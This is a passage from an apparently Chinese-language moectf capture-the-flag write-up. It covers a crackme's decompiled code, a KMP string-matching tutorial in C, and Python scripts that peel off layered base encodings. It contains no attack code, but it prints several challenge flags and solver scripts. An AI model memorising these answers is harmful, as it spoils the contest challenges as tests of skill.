</span></span><span class="line"><span class="cl">      <span class="n">v188</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="s">&#34;moectf{&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s2</span><span class="p">,</span> <span class="mi">7uLL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span><span class="c1">// 前缀不参与
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="cm">/* 另一大堆不明所以的加密 */</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v175</span> <span class="o">==</span> <span class="mi">233838060</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">a2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">sub_630390</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v183</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v189</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;X1I0X0YxYWdfWTB1XzRyZV9TdHIwbmd9&#34;</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">a2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">a3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="cm">/* 又是浩如烟海的看不懂的加密过程... */</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>在源代码中看见了<code>dcba3261b6ef0d77</code>和<code>X1I0X0YxYWdfWTB1XzRyZV9TdHIwbmd9</code>两串可疑的东东, 前面那串要么是<code>MD5</code>要么是<code>SHA1</code>, 后面那串肯定是<code>Base</code>系列的, 根据题目给的信息, 本题仅用了两种常见算法, 基本可以确定把俩解出来的字符串拼起来前面加上<code>moectf{</code>就OK了.</p>
<p>在网上找个工具成功解出<code>flag</code>: <code>moectf{enj0y_R4_F1ag_Y0u_4re_Str0ng}</code></p>
<h3 id="easy-c">Easy C++</h3>
<p>由于得到了我大哥的帮助, 我算是成功的解出来了这道题.. 由于写WP的环境换到了Linux, 就简单的讲一下这道题的思路吧..</p>
<p>这道题的<code>flag</code>: <code>moectf{CPP_BaSE64_CaeS@r_1S_s0_eaaaasy}</code></p>
<p>做题思路: 经过我大哥<code>Apache553</code>的努力, 把IDA中所有的函数全部识别了出来, 这道题才得以破解. 用<code>OllyDebug</code>调试过程中找到字符串比较的函数的汇编代码然后跟进, 可以在堆栈中发现一串base64, 应该是对应的密文. 通过<code>Apache553</code>的工程文件大概得知这是使用移位的方式构建了一个新的<code>table</code>, 于是写脚本循环构建<code>table</code>, 最终将<code>flag</code>爆破了出来. ( 我挺想写详细过程的, 但是Windows找不到显卡了开不了机, 就只能先凑合了&hellip; )</p>
<h2 id="programming">Programming</h2>
<h3 id="easy-ppc">Easy PPC</h3>
<p>读了下题目给的代码, 大概懂了意思之后, 写了一段小程序, 读取文件, 然后把数字提取出来:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="n">freopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">isdigit</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>得到了这么一串数字: <code>109111101991161021231128911610448110957811184956511097994811010064125</code></p>
<p>然后工具人基因觉醒, 手动分类, 分成<code>ASCII</code>应该有的样子:</p>
<p><code>109 111 101 99 116 102 123 112 89 116 104 48 110 95 78 111 84 95 65 110 97 99 48 110 100 64 125</code></p>
<p>然后再写一个程序:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">putchar</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>就是无脑把<code>x</code>当成<code>char</code>来输出..</p>
<p>把刚分好类的数字粘贴进去, 最后得到<code>flag</code>: <code>moectf{pYth0n_NoT_Anac0nd@}</code></p>
<h3 id="w1nd牛逼">w1nd牛逼！</h3>
<p>拿到这题, 面无表情的解压, 面无表情的用<code>Visual Studio Code</code>打开文件夹, 面无表情的点开在文件中搜索, 面无表情的输入<code>w1ndNiuBi</code>, 面无表情的打开全字匹配的开关, 面无表情的把总数扔进在线base64编码, 得到结果<code>moectf{NjMyNA==}</code>, 面无表情的提交&hellip; ( 好没意思的题 ( 溜了溜了</p>
<h3 id="a-template-problem">A Template Problem</h3>
<p>这个题看着只有一百分我却写了好久好久… 仿佛又回到了以前写NOIP却怎么也写不出来只能百度求助而对着求助来的代码不知所措的年代😭</p>
<p>这题要用到KMP算法&hellip;什么是KMP算法咧? 就是一个快速的模式串匹配算法&hellip;</p>
<p>啥又是模式串匹配?</p>
<p>模式串匹配, 就是给定一个需要处理的字符串 ( 会超级超级长 ) 和一个需要在文本串中搜索的模式串 ( 理论上长度应该远远小于需要处理的字符串, 否则没法玩了&hellip; ) , 查询在该文本串中, 给出的模式串是否出现, 出现的次数, 出现的位置等等等问题.</p>
<p>为啥要叫KMP?</p>
<blockquote>
<p>因为有三位伟大的科学家共同设计完成……分别是<code>D.E.Knuth</code> &amp; <code>J.H.Morris</code> &amp; <code>V.R.Pratt</code></p>
</blockquote>
<p>然而我并不需要知道他们都是谁谁谁&hellip;只需要知道这是个很流批的算法就好了..</p>
<p>从洛谷学来的:</p>
<blockquote>
<p>首先要理解，朴素的单模式串匹配大概就是枚举每一个文本串元素，然后从这一位开始不断向后比较，每次比较失败之后都要从头开始重新比对，大概期望时间复杂度在 θ(n+m) 左右，对于一般的弱数据还是阔以跑的了滴。但是其实是可以被卡成O(nm)的。emmmm并且还是比较容易卡的。</p>
<p>而 KMP的精髓在于，对于每次失配之后，我都不会从头重新开始枚举，而是根据我已经得知的数据，从某个特定的位置开始匹配；而对于模式串的每一位，都有<strong>唯一</strong>的“特定变化位置”，这个在失配之后的特定变化位置可以帮助我们利用已有的数据不用从头匹配，从而节约时间。</p>
<p>比如我们考虑一组样例：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串：</span><span class="n">abcab</span>
</span></span><span class="line"><span class="cl"><span class="err">文本串：</span><span class="n">abcacababcab</span>
</span></span></code></pre></div><p>首先，前四位按位匹配成功，遇到第五位不同，而这时，我们选择将abcab向右移三位，或者可以直接理解为移动到模式串中与失配字符相同的那一位。可以简单地理解为，我们将两个已经遍历过的模式串字符重合，导致我们可以不用一位一位地移动，而是根据相同的字符来实现快速移动。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串：</span>   <span class="n">abcab</span>
</span></span><span class="line"><span class="cl"><span class="err">文本串：</span><span class="n">abcacababcab</span>
</span></span></code></pre></div><p>但有时不光只会有单个字符重复：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串：</span><span class="n">abcabc</span>
</span></span><span class="line"><span class="cl"><span class="err">文本串：</span><span class="n">abcabdababcabc</span>
</span></span></code></pre></div><p>当我们发现在第六位失配时，我们可以将模式串的第一二位移动到第四五位，因为它们相同 .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串：</span>   <span class="n">abcabc</span>
</span></span><span class="line"><span class="cl"><span class="err">文本串：</span><span class="n">abcabdababcabc</span>
</span></span></code></pre></div><p>那么现在已经很明了了， KMP 的重头戏就在于用失配数组来确定当某一位失配时，我们可以将前一位跳跃到之前匹配过的某一位。而此处有几个先决条件需要理解：</p>
<p>1、<strong>我们的失配数组应当建立在模式串意义下，而不是文本串意义下</strong>。因为显然模式串要更加灵活，在失配后换位时，更灵活简便地处理。</p>
<p>2、如何确定位置呢？</p>
<p>首先我们要明白，基于先决条件11而言，我们在预处理时应当考虑当<strong>模式串</strong>的第 i位失配时，应当跳转到哪里.因为在文本串中，之前匹配过的所有字符已经没有用了——都是匹配完成或者已经失配的，所以我们的 kmp 数组（即是用于确定失配后变化位置的数组，下同）应当记录的是：</p>
<p><strong>在模式串 str1 中，对于每一位 str1[i],它的 kmp 数组应当是记录一个位置 j, j ≤ i 并且满足 str1[i]=str1[j] 并且在 j != 1 时理应满足 str1[1] 至 str1[j - 1] 分别与 str[i - j + 1] ~str1[i - 1] 按位相等</strong></p>
<p>上述即为移位法则</p>
<p>3、从前缀后缀来解释 <code>KMP</code> :</p>
<p>首先解释前后缀(因为太简单就不解释了 )：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">给定串：</span><span class="n">ABCABA</span>
</span></span><span class="line"><span class="cl"><span class="err">前缀：</span><span class="n">A</span><span class="p">,</span><span class="n">AB</span><span class="p">,</span><span class="n">ABC</span><span class="p">,</span><span class="n">ABCA</span><span class="p">,</span><span class="n">ABCAB</span><span class="p">,</span><span class="n">ABCABA</span>
</span></span><span class="line"><span class="cl"><span class="err">后缀：</span><span class="n">A</span><span class="p">,</span><span class="n">BA</span><span class="p">,</span><span class="n">ABA</span><span class="p">,</span><span class="n">CABA</span><span class="p">,</span><span class="n">BCABA</span><span class="p">,</span><span class="n">ABCABA</span>
</span></span></code></pre></div><p>其实刚才的移位法则就是对于模式串的每个前缀而言，用 <code>kmp</code> 数组记录到它为止的<strong>模式串前缀的真前缀和真后缀最大相同的位置</strong>（注意，这个地方没有写错，是真的有嵌套）。然而这个地方我们要考虑“<strong>模式串前缀</strong>的前缀和后缀最大相同的位置”原因在于，我们需要用到 <code>kmp</code>数组换位时，当且仅当未完全匹配。所以我们的操作只是针对模式串的前缀−−毕竟是失配函数，失配之后只有可能是某个部分前缀需要“快速移动”。所以这就可以解释 <code>KMP</code>中前后缀应用的一个特点：</p>
<p><code>KMP</code>中前后缀不包括模式串本身,即<strong>只考虑真前缀和真后缀</strong>,因为模式串本身需要整体考虑，当且仅当匹配完整个串之后；而匹配完整个串不就完成匹配了吗&hellip;</p>
</blockquote>
<p>这个我觉得很详细了&hellip;那怎么根据<code>KMP</code>算法写代码呢..? ( 我觉得编程题的WP最难写, 还要写<code>TreeDistance</code>&hellip; )</p>
<p>先把代码贴出来:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;string.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">S</span><span class="p">[</span><span class="mi">1000000</span><span class="p">]</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="n">T</span><span class="p">[</span><span class="mi">1000000</span><span class="p">]</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">next</span><span class="p">[</span><span class="mi">100000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">Next</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="n">T</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">next</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="n">memset</span><span class="p">(</span><span class="n">next</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">T</span><span class="p">));</span>   <span class="c1">// 初始化动态数组,将其长度设置为0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">T</span><span class="p">);</span>       <span class="c1">// 把next数组的长度扩展到和T的长度一致
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">next</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">T</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">j</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">T</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">T</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">next</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">T</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">T</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">next</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">KMP</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">S</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span> <span class="n">T</span><span class="p">,</span><span class="kt">int</span> <span class="n">i</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    <span class="c1">// count的缩写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Next</span><span class="p">(</span><span class="n">T</span><span class="p">,</span> <span class="n">next</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">slen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">S</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">tlen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">T</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">slen</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">j</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">T</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">next</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">T</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="o">++</span><span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">tlen</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span><span class="n">i</span> <span class="o">-</span> <span class="n">tlen</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">++</span><span class="n">cnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">next</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span><span class="n">S</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span><span class="n">T</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">KMP</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">T</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//printf(&#34;%d &#34;,i);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//system(&#34;pause&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>woc&hellip; 我不想写了&hellip; 代码原理已经放出来了,, 接下来的看代码吧&hellip;</p>
<h3 id="perfect-repeater">Perfect Repeater</h3>
<p>如果我能做出来我再写&hellip; 我还做不出来</p>
<h3 id="frank-nb">Frank NB!</h3>
<p>我写这道题的时候&hellip; 差点就当了工具人&hellip; 不过还好有工具…. Frank NB! Visual Studio Code NB!</p>
<p>下载完题目给的压缩包, 然后解压, 然后进入文件夹, 然后右键在 V S Code 中打开, 然后点击左侧的放大镜, 然后输入 <code>^[a-zA-Z][0-9]{3,5}[~!@#$%^&amp;*()_+][A-Za-z]{0,8}$</code>, 然后回车搜索…</p>
<p>WD**D咋不对啊..?!</p>
<p>噢噢还得排除一下<code>FrankNB?</code>的文件&hellip;</p>
<p>工具人基因觉醒!</p>
<p>手动删掉了所有<code>FrankNB?</code>之后, 终于获取了正确的数, 然后<code>SHA256</code>算一遍之后拿到<code>flag</code>…</p>
<h3 id="random-encode">Random Encode</h3>
<p>这题读了读代码, 发现还真就是随机加密&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">Random</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">EncoderSet</span> <span class="o">=</span> <span class="p">[</span><span class="n">a85encode</span><span class="p">,</span><span class="n">b16encode</span><span class="p">,</span><span class="n">b32encode</span><span class="p">,</span><span class="n">b64encode</span><span class="p">,</span><span class="n">b85encode</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span><span class="mi">35</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">Encoder</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">)(</span><span class="nb">str</span><span class="p">(</span><span class="n">EncoderSet</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">Encoder</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s1">&#39;w1ndNB&#39;</span> <span class="o">+</span> <span class="n">Encoder</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;secret.txt&#39;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><p>发现脚本应该是把正确的<code>flag</code>随机选加密方式加密了30多层, 然后就产生了一个40多MB的大家伙&hellip; 我忽然产生了一个想法, 既然有随机加密算法选择的提示, 那我何不把每种算法的提示头都算出来, 然后每解密一次, 就读个头然后查表, 对应解密呢?</p>
<p>然后就有了一个小脚本:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">Random</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">EncoderSet</span> <span class="o">=</span> <span class="p">[</span><span class="n">a85encode</span><span class="p">,</span><span class="n">b16encode</span><span class="p">,</span><span class="n">b32encode</span><span class="p">,</span><span class="n">b64encode</span><span class="p">,</span><span class="n">b85encode</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">EncoderSet</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">)(</span><span class="nb">str</span><span class="p">(</span><span class="n">EncoderSet</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
</span></span></code></pre></div><p>然后运行这个脚本N次之后, 统计得出所有加密方式可能出现的文件头:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Fa&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0E&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;30&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GA======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b16</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;F#&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0`&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MQ==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;31&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GE======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b32</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;G5&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&amp;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mg==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;32&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GI======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b64</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;GX&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1B&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mw==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;33&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GM======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Gy&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;NA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;34&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GQ======&#39;</span><span class="p">]</span>
</span></span></code></pre></div><p>然后写了个脚本:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Fa&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0E&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;30&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GA======&#39;</span><span class="p">]</span>
